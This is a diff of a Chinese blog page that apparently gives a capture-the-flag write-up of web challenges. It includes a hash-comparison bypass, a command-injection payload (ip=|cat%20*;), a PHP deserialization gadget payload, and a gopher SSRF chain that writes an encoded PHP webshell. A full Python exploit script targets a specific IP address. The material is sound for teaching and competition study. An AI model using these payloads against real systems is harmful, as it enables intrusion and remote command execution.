+    $name=&#39;0e&#39;.$int;
+    $int++;
+    $md4=hash(&#39;md4&#39;,$name);
+}
+echo $name;</code></pre>
 <p>数组绕过hash比较，</p>
 <p>最终exp</p>
-<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hash1=<span class="number">0e251288019</span>&amp;hash2[]=<span class="number">1</span>&amp;hash3[]=<span class="number">2</span>&amp;hash4=ffifdyop</span><br></pre></td></tr></table></figure>
-
+<pre><code class="haskell">?hash1=0e251288019&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=ffifdyop</code></pre>
 <h2 id="主动"><a href="#主动" class="headerlink" title="主动"></a>主动</h2><blockquote>
 <p>命令执行</p>
 </blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">"index.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/i"</span>, $_GET[<span class="string">"ip"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no flag"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(<span class="string">"ping -c 3 $_GET[ip]"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+highlight_file(&quot;index.php&quot;);
 
+if(preg_match(&quot;/flag/i&quot;, $_GET[&quot;ip&quot;]))
+{
+    die(&quot;no flag&quot;);
+}
+
+system(&quot;ping -c 3 $_GET[ip]&quot;);
+
+?&gt; </code></pre>
 <p>简单命令拼接</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=|cat%20*;</span><br></pre></td></tr></table></figure>
-
-<h2 id="half-infiltration"><a href="#half-infiltration" class="headerlink" title="half_infiltration"></a>half_infiltration</h2><blockquote>
+<pre><code>ip=|cat%20*;</code></pre><h2 id="half-infiltration"><a href="#half-infiltration" class="headerlink" title="half_infiltration"></a>half_infiltration</h2><blockquote>
 <p>php反序列化 ssrf+gopher</p>
 </blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$flag = file_get_contents(<span class="string">'ssrf.php'</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">global</span> $result;</span><br><span class="line">        <span class="keyword">print</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age, $sex, $num;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $student = <span class="keyword">$this</span>-&gt;age;</span><br><span class="line">        $boy = <span class="keyword">$this</span>-&gt;sex;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;num;</span><br><span class="line">        $student-&gt;$boy();</span><br><span class="line">        <span class="keyword">if</span> (!(is_string($a)) || !(is_string($boy)) || !(is_object($student))) &#123;</span><br><span class="line">            ob_end_clean();</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">global</span> $$a;</span><br><span class="line">        $result = $GLOBALS[<span class="string">'flag'</span>];</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x'</span>])) &#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'x'</span>])-&gt;get_it();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+$flag = file_get_contents(&#39;ssrf.php&#39;);
+class Pass
+{
 
+    function read()
+    {
+        ob_start();
+        global $result;
+        print $result;
+    }
+}
+class User
+{
+    public $age, $sex, $num;
+    function __destruct()
+    {
+        $student = $this-&gt;age;
+        $boy = $this-&gt;sex;
+        $a = $this-&gt;num;
+        $student-&gt;$boy();
+        if (!(is_string($a)) || !(is_string($boy)) || !(is_object($student))) {
+            ob_end_clean();
+            exit();
+        }
+        global $$a;
+        $result = $GLOBALS[&#39;flag&#39;];
+        ob_end_clean();
+    }
+}
+if (isset($_GET[&#39;x&#39;])) {
+    unserialize($_GET[&#39;x&#39;])-&gt;get_it();
+}</code></pre>
 <p>参考第五空间的《do you know》，把原来的payload改一改变量名即可</p>
 <blockquote>
 <p>考点：</p>
@@ -454,18 +665,80 @@
 <li>global处触发exception，因为global $this是非法的</li>
 </ol>
 </blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age,$sex,$num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> User();</span><br><span class="line">$a-&gt;age = <span class="keyword">new</span> Pass();</span><br><span class="line">$a-&gt;sex = <span class="string">'read'</span>;</span><br><span class="line">$a-&gt;num = <span class="string">'result'</span>;</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> User();</span><br><span class="line">$b-&gt;age = <span class="keyword">new</span> Pass();</span><br><span class="line">$b-&gt;sex = <span class="string">'read'</span>;</span><br><span class="line">$b-&gt;num = <span class="string">'this'</span>;</span><br><span class="line"></span><br><span class="line">$c = <span class="string">"Tyao"</span>;</span><br><span class="line">$x = <span class="keyword">array</span>($a, $b, $c);</span><br><span class="line"><span class="keyword">echo</span>(serialize($x));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">output:</span></span><br><span class="line"><span class="comment">a:3:&#123;i:0;O:4:%22User%22:3:&#123;s:3:%22age%22;O:4:%22Pass%22:0:&#123;&#125;s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:6:%22result%22;&#125;i:1;O:4:%22User%22:3:&#123;s:3:%22age%22;O:4:%22Pass%22:0:&#123;&#125;s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:4:%22this%22;&#125;i:2;s:4:%22Tyao%22;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+class Pass
+{
 
+}
+
+class User
+{
+    public $age,$sex,$num;
+}
+
+$a = new User();
+$a-&gt;age = new Pass();
+$a-&gt;sex = &#39;read&#39;;
+$a-&gt;num = &#39;result&#39;;
+
+$b = new User();
+$b-&gt;age = new Pass();
+$b-&gt;sex = &#39;read&#39;;
+$b-&gt;num = &#39;this&#39;;
+
+$c = &quot;Tyao&quot;;
+$x = array($a, $b, $c);
+echo(serialize($x));
+
+/* 
+output:
+a:3:{i:0;O:4:%22User%22:3:{s:3:%22age%22;O:4:%22Pass%22:0:{}s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:6:%22result%22;}i:1;O:4:%22User%22:3:{s:3:%22age%22;O:4:%22Pass%22:0:{}s:3:%22sex%22;s:4:%22read%22;s:3:%22num%22;s:4:%22this%22;}i:2;s:4:%22Tyao%22;}
+*/</code></pre>
 <p>转到内网渗透，给到一个ssrf接口，端口在40000，点进去只有一个文件上传，没有禁gopher协议，盲猜是gopher+ssrf</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网</span></span><br><span class="line">    $url = $_GET[<span class="string">'we_have_done_ssrf_here_could_you_help_to_continue_it'</span>] ?? <span class="keyword">false</span>; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/flag|var|apache|conf|proc|log/i"</span> ,$url))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">""</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($url)</span><br><span class="line">    &#123; </span><br><span class="line"></span><br><span class="line">            $ch = curl_init(); </span><br><span class="line">            curl_setopt($ch, CURLOPT_URL, $url); </span><br><span class="line">            curl_setopt($ch, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">            curl_exec($ch);</span><br><span class="line">            curl_close($ch); </span><br><span class="line"></span><br><span class="line">     &#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php 
+//经过扫描确认35000以下端口以及50000以上端口不存在任何内网服务,请继续渗透内网
+    $url = $_GET[&#39;we_have_done_ssrf_here_could_you_help_to_continue_it&#39;] ?? false; 
+        if(preg_match(&quot;/flag|var|apache|conf|proc|log/i&quot; ,$url)){
+                die(&quot;&quot;);
+        }
 
+        if($url)
+    { 
+
+            $ch = curl_init(); 
+            curl_setopt($ch, CURLOPT_URL, $url); 
+            curl_setopt($ch, CURLOPT_HEADER, 1);
+            curl_exec($ch);
+            curl_close($ch); 
+
+     } 
+
+?&gt;</code></pre>
 <p>这里很多坑，文件名不能含有<code>write</code>，一度以为<code>filter</code>写不了文件，后来才发现<code>write</code>是可以省略的 : ）</p>
 <p>文件内容不能含有<code>&lt;?</code>、<code>php</code>、<code>&lt;script</code>等等标签，需要<strong>同时</strong>用<code>rot13</code>和<code>base64</code>绕过（也不太懂什么base64之后也可以检测到<code>php</code>字段</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64_encode(rot13(<span class="string">'&lt;?php echo system("cat /flag");//'</span>)) = <span class="string">"PD9jdWMgcnB1YiBmbGZncnooInBuZyAvc3ludCIpOy8v"</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="python">base64_encode(rot13(&#39;&lt;?php echo system(&quot;cat /flag&quot;);//&#39;)) = &quot;PD9jdWMgcnB1YiBmbGZncnooInBuZyAvc3ludCIpOy8v&quot;</code></pre>
 <p>给出最终exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ssid = <span class="string">"ttt"</span></span><br><span class="line">post_string = <span class="string">"file=php://filter/convert.base64-decode|string.rot13/resource=1.php&amp;content=PD9jdWMgcnB1YiBmbGZncnooInBuZyAvc3ludCIpOy8v"</span></span><br><span class="line">length = len(post_string)</span><br><span class="line"></span><br><span class="line">paramsGet = &#123;<span class="string">"we_have_done_ssrf_here_could_you_help_to_continue_it"</span>:<span class="string">"gopher://127.0.0.1:40000/_POST /index.php HTTP/1.1%%0d%%0a\</span></span><br><span class="line"><span class="string">Host:127.0.0.1:40000%%0d%%0aCookie:PHPSESSID=%s;%%0d%%0aConnection:close%%0d%%0aContent-Type:application/x-www-form-urlencoded%%0d%%0aContent-Length: %d%%0d%%0a%%0d%%0a\</span></span><br><span class="line"><span class="string">%s"</span> % (ssid, length, post_string)&#125;</span><br><span class="line">res = rq.get(<span class="string">"http://39.98.131.124/ssrf.php"</span>, params=paramsGet)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line"></span><br><span class="line">res2 = rq.get(<span class="string">"http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=127.0.0.1:40000/uploads/ttt/"</span>)</span><br><span class="line">files = re.findall(<span class="string">'&lt;a href=".*?"&gt;(.*?)&lt;/a&gt;'</span>, res2.text)[<span class="number">5</span>:]</span><br><span class="line">print(<span class="string">"=========FILES============"</span>)</span><br><span class="line">print(<span class="string">"\n"</span>.join(files))</span><br><span class="line">print(<span class="string">"=========================="</span>)</span><br><span class="line"></span><br><span class="line">res3 = rq.get(<span class="string">"http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=127.0.0.1:40000/uploads/ttt/1.php"</span>)</span><br><span class="line">print(res3.text)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import requests as rq
+import re
 
+ssid = &quot;ttt&quot;
+post_string = &quot;file=php://filter/convert.base64-decode|string.rot13/resource=1.php&amp;content=PD9jdWMgcnB1YiBmbGZncnooInBuZyAvc3ludCIpOy8v&quot;
+length = len(post_string)
+
+paramsGet = {&quot;we_have_done_ssrf_here_could_you_help_to_continue_it&quot;:&quot;gopher://127.0.0.1:40000/_POST /index.php HTTP/1.1%%0d%%0a\
+Host:127.0.0.1:40000%%0d%%0aCookie:PHPSESSID=%s;%%0d%%0aConnection:close%%0d%%0aContent-Type:application/x-www-form-urlencoded%%0d%%0aContent-Length: %d%%0d%%0a%%0d%%0a\
+%s&quot; % (ssid, length, post_string)}
+res = rq.get(&quot;http://39.98.131.124/ssrf.php&quot;, params=paramsGet)
+# print(res.text)
+
+res2 = rq.get(&quot;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=127.0.0.1:40000/uploads/ttt/&quot;)
+files = re.findall(&#39;&lt;a href=&quot;.*?&quot;&gt;(.*?)&lt;/a&gt;&#39;, res2.text)[5:]
+print(&quot;=========FILES============&quot;)
+print(&quot;\n&quot;.join(files))
+print(&quot;==========================&quot;)
+
+res3 = rq.get(&quot;http://39.98.131.124/ssrf.php?we_have_done_ssrf_here_could_you_help_to_continue_it=127.0.0.1:40000/uploads/ttt/1.php&quot;)
+print(res3.text)</code></pre>
 
       
     </div>
@@ -596,7 +869,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-count">30</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -609,7 +882,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -700,6 +973,17 @@
   <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
 -->
 
+
+
+
+
+<!-- Highlight.js -->
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js">
+</script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
 
 
         
